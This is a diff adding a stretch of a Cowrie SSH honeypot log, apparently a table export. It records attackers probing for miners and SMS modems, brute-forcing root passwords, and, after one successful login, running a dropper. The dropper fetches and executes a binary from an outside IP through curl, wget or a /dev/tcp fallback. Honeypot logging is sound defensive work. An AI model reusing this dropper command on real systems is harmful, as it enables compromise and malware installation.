@@ -1,0 +1,101 @@
+2023-11-27T04:04:03+0000	[-] Python Version 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]	Unnamed: 2	Unnamed: 3	Unnamed: 4
+2023-11-29T02:10:02+0000	[HoneyPotSSHTransport,219,222.186.16.198] Closing TTY Log: var/lib/cowrie/tty/52a532334011a67d1c41a57	ee	a38	ed25893bff4b6c264c748c3f2df576a47f4a after 0 seconds
+2023-11-29T02:10:02+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] remote close			
+2023-11-29T02:10:02+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
+2023-11-29T02:10:02+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
+2023-11-29T02:10:02+0000	"[twisted.conch.ssh.session#info] Executing command ""b""ps | grep '[Mm]iner'"""""			
+2023-11-29T02:10:02+0000	[SSHChannel session (4) on SSHService b'ssh-connection' on HoneyPotSSHTransport,219,222.186.16.198] C	MD	: p	s | grep '[Mm]iner'
+2023-11-29T02:10:02+0000	[SSHChannel session (4) on SSHService b'ssh-connection' on HoneyPotSSHTransport,219,222.186.16.198] C	om	man	d found: grep [Mm]iner
+2023-11-29T02:10:02+0000	[SSHChannel session (4) on SSHService b'ssh-connection' on HoneyPotSSHTransport,219,222.186.16.198] C	om	man	d found: ps
+2023-11-29T02:10:02+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-29T02:10:02+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
+2023-11-29T02:10:02+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 4			
+2023-11-29T02:10:03+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-29T02:10:03+0000	[HoneyPotSSHTransport,219,222.186.16.198] Closing TTY Log: var/lib/cowrie/tty/4e9fdfe29ef2ada08ab1e29	f7	b3e	f7d297dfa86d002069289e7a7ae21b343904 after 0 seconds
+2023-11-29T02:10:03+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] remote close			
+2023-11-29T02:10:03+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
+2023-11-29T02:10:03+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
+2023-11-29T02:10:03+0000	"[twisted.conch.ssh.session#info] Executing command ""b""ps -ef | grep '[Mm]iner'"""""			
+2023-11-29T02:10:03+0000	[SSHChannel session (5) on SSHService b'ssh-connection' on HoneyPotSSHTransport,219,222.186.16.198] C	MD	: p	s -ef | grep '[Mm]iner'
+2023-11-29T02:10:03+0000	[SSHChannel session (5) on SSHService b'ssh-connection' on HoneyPotSSHTransport,219,222.186.16.198] C	om	man	d found: grep [Mm]iner
+2023-11-29T02:10:03+0000	[SSHChannel session (5) on SSHService b'ssh-connection' on HoneyPotSSHTransport,219,222.186.16.198] C	om	man	d found: ps -ef
+2023-11-29T02:10:03+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-29T02:10:03+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
+2023-11-29T02:10:03+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 5			
+2023-11-29T02:10:03+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-29T02:10:03+0000	[HoneyPotSSHTransport,219,222.186.16.198] Closing TTY Log: var/lib/cowrie/tty/e5cefcb1b141654b896106c	8d	c78	ae972511ca8772b28e593dbe256993fa8437 after 0 seconds
+2023-11-29T02:10:04+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] remote close			
+2023-11-29T02:10:04+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
+2023-11-29T02:10:04+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
+2023-11-29T02:10:04+0000	"[twisted.conch.ssh.session#info] Executing command ""b'ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool"	/s	ms/	"* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*'"""
+2023-11-29T02:10:04+0000	[SSHChannel session (6) on SSHService b'ssh-connection' on HoneyPotSSHTransport,219,222.186.16.198] C	MD	: l	s -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2023-11-29T02:10:04+0000	[SSHChannel session (6) on SSHService b'ssh-connection' on HoneyPotSSHTransport,219,222.186.16.198] C	om	man	d found: ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2023-11-29T02:10:04+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-29T02:10:04+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
+2023-11-29T02:10:04+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 6			
+2023-11-29T02:10:04+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-29T02:10:04+0000	[HoneyPotSSHTransport,219,222.186.16.198] Closing TTY Log: var/lib/cowrie/tty/baaa3eb1b4234e92bb652c2	99	227	7b87dbe17c9080a5f6d842fc72563087dbd8 after 0 seconds
+2023-11-29T02:10:04+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] remote close			
+2023-11-29T02:10:04+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
+2023-11-29T02:10:04+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
+2023-11-29T02:10:05+0000	"[twisted.conch.ssh.session#info] Executing command ""b'echo Hi | cat -n'"""			
+2023-11-29T02:10:05+0000	[SSHChannel session (7) on SSHService b'ssh-connection' on HoneyPotSSHTransport,219,222.186.16.198] C	MD	: e	cho Hi | cat -n
+2023-11-29T02:10:05+0000	[SSHChannel session (7) on SSHService b'ssh-connection' on HoneyPotSSHTransport,219,222.186.16.198] C	om	man	d found: cat -n
+2023-11-29T02:10:05+0000	[SSHChannel session (7) on SSHService b'ssh-connection' on HoneyPotSSHTransport,219,222.186.16.198] C	om	man	d found: echo Hi
+2023-11-29T02:10:05+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-29T02:10:05+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
+2023-11-29T02:10:05+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 7			
+2023-11-29T02:10:05+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-29T02:10:05+0000	[HoneyPotSSHTransport,219,222.186.16.198] Closing TTY Log: var/lib/cowrie/tty/3e8341eade715d716ae9fe3	7d	b38	0fb9cab5f953782fe691fcf3af29041a344e after 0 seconds
+2023-11-29T02:10:05+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] remote close			
+2023-11-29T02:11:58+0000	[HoneyPotSSHTransport,219,222.186.16.198] Got remote error, code 11 reason: b'disconnected by user'			
+2023-11-29T02:11:58+0000	[HoneyPotSSHTransport,219,222.186.16.198] avatar root logging out			
+2023-11-29T02:11:58+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
+2023-11-29T02:11:58+0000	[HoneyPotSSHTransport,219,222.186.16.198] Connection lost after 121 seconds			
+2023-11-29T02:15:35+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1			
+2023-11-29T02:15:35+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256			
+2023-11-29T02:15:35+0000	[cowrie.ssh.factory.CowrieSSHFactory] New connection: 146.190.63.65:57428 (172.17.0.2:2222) [session:	2	ad4	a97fddcd]
+2023-11-29T02:15:35+0000	[HoneyPotSSHTransport,220,146.190.63.65] Remote SSH version: SSH-2.0-Go			
+2023-11-29T02:15:35+0000	[HoneyPotSSHTransport,220,146.190.63.65] SSH client hassh fingerprint: 4e066189c3bbeec38c99b185511373	3a		
+2023-11-29T02:15:35+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-n	is	tp2	56'
+2023-11-29T02:15:35+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
+2023-11-29T02:15:35+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'			
+2023-11-29T02:15:35+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
+2023-11-29T02:15:35+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
+2023-11-29T02:15:35+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'opc' trying auth b'none'			
+2023-11-29T02:15:35+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'opc' trying auth b'password'			
+2023-11-29T02:15:35+0000	[HoneyPotSSHTransport,220,146.190.63.65] Could not read etc/userdb.txt, default database activated			
+2023-11-29T02:15:35+0000	[HoneyPotSSHTransport,220,146.190.63.65] login attempt [b'opc'/b'solaris_opc'] failed			
+2023-11-29T02:15:36+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'opc' failed auth b'password'			
+2023-11-29T02:15:36+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
+2023-11-29T02:15:36+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
+2023-11-29T02:15:36+0000	[HoneyPotSSHTransport,220,146.190.63.65] Connection lost after 1 seconds			
+2023-11-29T02:18:08+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1			
+2023-11-29T02:18:08+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256			
+2023-11-29T02:18:08+0000	[cowrie.ssh.factory.CowrieSSHFactory] New connection: 47.105.110.107:46044 (172.17.0.2:2222) [session	:	cf1	dae89bfdd]
+2023-11-29T02:18:08+0000	[HoneyPotSSHTransport,221,47.105.110.107] Remote SSH version: SSH-2.0-makiko			
+2023-11-29T02:18:08+0000	[HoneyPotSSHTransport,221,47.105.110.107] SSH client hassh fingerprint: 2f5ebb184f5d02324eed9a822f525	9d	c	
+2023-11-29T02:18:08+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ssh-ed25519'			
+2023-11-29T02:18:08+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
+2023-11-29T02:18:08+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'			
+2023-11-29T02:18:09+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
+2023-11-29T02:18:09+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
+2023-11-29T02:18:09+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'			
+2023-11-29T02:18:09+0000	[HoneyPotSSHTransport,221,47.105.110.107] Could not read etc/userdb.txt, default database activated			
+2023-11-29T02:18:09+0000	[HoneyPotSSHTransport,221,47.105.110.107] login attempt [b'root'/b'123456'] failed			
+2023-11-29T02:18:10+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'			
+2023-11-29T02:18:10+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
+2023-11-29T02:18:11+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'			
+2023-11-29T02:18:11+0000	[HoneyPotSSHTransport,221,47.105.110.107] Could not read etc/userdb.txt, default database activated			
+2023-11-29T02:18:11+0000	[HoneyPotSSHTransport,221,47.105.110.107] login attempt [b'root'/b'12345678'] succeeded			
+2023-11-29T02:18:11+0000	[HoneyPotSSHTransport,221,47.105.110.107] Initialized emulated server as architecture: linux-x64-lsb			
+2023-11-29T02:18:11+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'			
+2023-11-29T02:18:11+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'			
+2023-11-29T02:18:11+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
+2023-11-29T02:18:11+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
+2023-11-29T02:18:11+0000	[twisted.conch.ssh.session#info] Getting shell			
+2023-11-29T02:18:11+0000	[HoneyPotSSHTransport,221,47.105.110.107] CMD: echo 1 && cat /bin/echo			
+2023-11-29T02:18:11+0000	[HoneyPotSSHTransport,221,47.105.110.107] Command found: echo 1			
+2023-11-29T02:18:11+0000	[HoneyPotSSHTransport,221,47.105.110.107] Command found: cat /bin/echo			
+2023-11-29T02:18:18+0000	"[HoneyPotSSHTransport,221,47.105.110.107] CMD: nohup $SHELL -c ""curl http://117.156.94.41:60104/linux"	-	o /	"tmp/vymmAc6EMt; if [ ! -f /tmp/vymmAc6EMt ]; then wget http://117.156.94.41:60104/linux -O /tmp/vymmAc6EMt; fi; if [ ! -f /tmp/vymmAc6EMt ]; then exec 6<>/dev/tcp/117.156.94.41/60104 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/vymmAc6EMt && chmod +x /tmp/vymmAc6EMt && /tmp/vymmAc6EMt i8b5xbUIc5wunHEIvsL73PD21/jErBd1mi6bdB+ixvjI9PTX8sa8F3GfIJ12CL3D+sj389bmwbQSf58wmHYSrMT7yPf11+bCvhNrmDCYfxC8wfrW5vfX/969E3OHOZ1rEr3K/tb39tLowbwVa5g1mmsUuMfm1PH80PjBvxZlnTOHdBO53vne9ejV+cq6FnSZM4l0FLje/NHo9dPmwrscc5kxm3cGuMfm0fDo1f/evhVzkzaZdBe50PDI9PfW5sG/E2uYOJx/ELzB+NLm99f53rgSa5g2m2sXv8Ty0Pb31PnQvhR0hzGefQi1x+bV//zQ+MG9FmWRLpt0HqLB/NDo99z+wL0XcIkxmHUIvcn5yPT13ubBvBxzmTGacga03vnV8ejX/N69EXCTNpl0FLvQ/d7o9NL53r4WdIcym3McusD51f/m0/DevhR0hzGRdwi6wvLQ9vfW+NC4FWuYM5hrFL7F5tf299z+wL0UdYkxmHQIusPm0vLo0PrKuhZ0mTaJcRGiwfjT6PfX+N69FnKTNpl0F73Q+dTy6NL/3r8Ta5s3k3MWvcL6xvf33+bJugh0kTmHcx+2xvjX9vTG+cW4CHWHM5hrF7rB8tD299b+0LgRa5szn2sXvsDm1/L13P7AvRJ2iTSaaxe5xebX8vTI+sG8HHOZMZp1BrjD5tfz8Mj6w7QIdJ4yk3MWvcL8xvT01+bCvRZrmjOHdhS2xvjX9fDG/MOiF3CcLph9FqLB8dX88Nb5xL0GfYcxmnIIvcTm1/Hz3P7AvRRyiTiHdxe83vnV8+jX8MW2EHWYMJ2rdLm9OfnQNS2cld+1TXGSbU9e; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/vymmAc6EMt && /tmp/vymmAc6EMt i8b5xbUIc5wunHEIvsL73PD21/jErBd1mi6bdB+ixvjI9PTX8sa8F3GfIJ12CL3D+sj389bmwbQSf58wmHYSrMT7yPf11+bCvhNrmDCYfxC8wfrW5vfX/969E3OHOZ1rEr3K/tb39tLowbwVa5g1mmsUuMfm1PH80PjBvxZlnTOHdBO53vne9ejV+cq6FnSZM4l0FLje/NHo9dPmwrscc5kxm3cGuMfm0fDo1f/evhVzkzaZdBe50PDI9PfW5sG/E2uYOJx/ELzB+NLm99f53rgSa5g2m2sXv8Ty0Pb31PnQvhR0hzGefQi1x+bV//zQ+MG9FmWRLpt0HqLB/NDo99z+wL0XcIkxmHUIvcn5yPT13ubBvBxzmTGacga03vnV8ejX/N69EXCTNpl0FLvQ/d7o9NL53r4WdIcym3McusD51f/m0/DevhR0hzGRdwi6wvLQ9vfW+NC4FWuYM5hrFL7F5tf299z+wL0UdYkxmHQIusPm0vLo0PrKuhZ0mTaJcRGiwfjT6PfX+N69FnKTNpl0F73Q+dTy6NL/3r8Ta5s3k3MWvcL6xvf33+bJugh0kTmHcx+2xvjX9vTG+cW4CHWHM5hrF7rB8tD299b+0LgRa5szn2sXvsDm1/L13P7AvRJ2iTSaaxe5xebX8vTI+sG8HHOZMZp1BrjD5tfz8Mj6w7QIdJ4yk3MWvcL8xvT01+bCvRZrmjOHdhS2xvjX9fDG/MOiF3CcLph9FqLB8dX88Nb5xL0GfYcxmnIIvcTm1/Hz3P7AvRRyiTiHdxe83vnV8+jX8MW2EHWYMJ2rdLm9OfnQNS2cld+1TXGSbU9e"" &"
+2023-11-29T02:18:18+0000	[HoneyPotSSHTransport,221,47.105.110.107] Command found: nohup /bin/bash -c curl http://117.156.94.41	:6	10	4/linux -o /tmp/vymmAc6EMt; if [ ! -f /tmp/vymmAc6EMt ]; then wget http://117.156.94.41:60104/linux -O /tmp/vymmAc6EMt; fi; if [ ! -f /tmp/vymmAc6EMt ]; then exec 6<>/dev/tcp/117.156.94.41/60104 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/vymmAc6EMt && chmod +x /tmp/vymmAc6EMt && /tmp/vymmAc6EMt i8b5xbUIc5wunHEIvsL73PD21/jErBd1mi6bdB+ixvjI9PTX8sa8F3GfIJ12CL3D+sj389bmwbQSf58wmHYSrMT7yPf11+bCvhNrmDCYfxC8wfrW5vfX/969E3OHOZ1rEr3K/tb39tLowbwVa5g1mmsUuMfm1PH80PjBvxZlnTOHdBO53vne9ejV+cq6FnSZM4l0FLje/NHo9dPmwrscc5kxm3cGuMfm0fDo1f/evhVzkzaZdBe50PDI9PfW5sG/E2uYOJx/ELzB+NLm99f53rgSa5g2m2sXv8Ty0Pb31PnQvhR0hzGefQi1x+bV//zQ+MG9FmWRLpt0HqLB/NDo99z+wL0XcIkxmHUIvcn5yPT13ubBvBxzmTGacga03vnV8ejX/N69EXCTNpl0FLvQ/d7o9NL53r4WdIcym3McusD51f/m0/DevhR0hzGRdwi6wvLQ9vfW+NC4FWuYM5hrFL7F5tf299z+wL0UdYkxmHQIusPm0vLo0PrKuhZ0mTaJcRGiwfjT6PfX+N69FnKTNpl0F73Q+dTy6NL/3r8Ta5s3k3MWvcL6xvf33+bJugh0kTmHcx+2xvjX9vTG+cW4CHWHM5hrF7rB8tD299b+0LgRa5szn2sXvsDm1/L13P7AvRJ2iTSaaxe5xebX8vTI+sG8HHOZMZp1BrjD5tfz8Mj6w7QIdJ4yk3MWvcL8xvT01+bCvRZrmjOHdhS2xvjX9fDG/MOiF3CcLph9FqLB8dX88Nb5xL0GfYcxmnIIvcTm1/Hz3P7AvRRyiTiHdxe83vnV8+jX8MW2EHWYMJ2rdLm9OfnQNS2cld+1TXGSbU9e; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/vymmAc6EMt && /tmp/vymmAc6EMt i8b5xbUIc5wunHEIvsL73PD21/jErBd1mi6bdB+ixvjI9PTX8sa8F3GfIJ12CL3D+sj389bmwbQSf58wmHYSrMT7yPf11+bCvhNrmDCYfxC8wfrW5vfX/969E3OHOZ1rEr3K/tb39tLowbwVa5g1mmsUuMfm1PH80PjBvxZlnTOHdBO53vne9ejV+cq6FnSZM4l0FLje/NHo9dPmwrscc5kxm3cGuMfm0fDo1f/evhVzkzaZdBe50PDI9PfW5sG/E2uYOJx/ELzB+NLm99f53rgSa5g2m2sXv8Ty0Pb31PnQvhR0hzGefQi1x+bV//zQ+MG9FmWRLpt0HqLB/NDo99z+wL0XcIkxmHUIvcn5yPT13ubBvBxzmTGacga03vnV8ejX/N69EXCTNpl0FLvQ/d7o9NL53r4WdIcym3McusD51f/m0/DevhR0hzGRdwi6wvLQ9vfW+NC4FWuYM5hrFL7F5tf299z+wL0UdYkxmHQIusPm0vLo0PrKuhZ0mTaJcRGiwfjT6PfX+N69FnKTNpl0F73Q+dTy6NL/3r8Ta5s3k3MWvcL6xvf33+bJugh0kTmHcx+2xvjX9vTG+cW4CHWHM5hrF7rB8tD299b+0LgRa5szn2sXvsDm1/L13P7AvRJ2iTSaaxe5xebX8vTI+sG8HHOZMZp1BrjD5tfz8Mj6w7QIdJ4yk3MWvcL8xvT01+bCvRZrmjOHdhS2xvjX9fDG/MOiF3CcLph9FqLB8dX88Nb5xL0GfYcxmnIIvcTm1/Hz3P7AvRRyiTiHdxe83vnV8+jX8MW2EHWYMJ2rdLm9OfnQNS2cld+1TXGSbU9e &
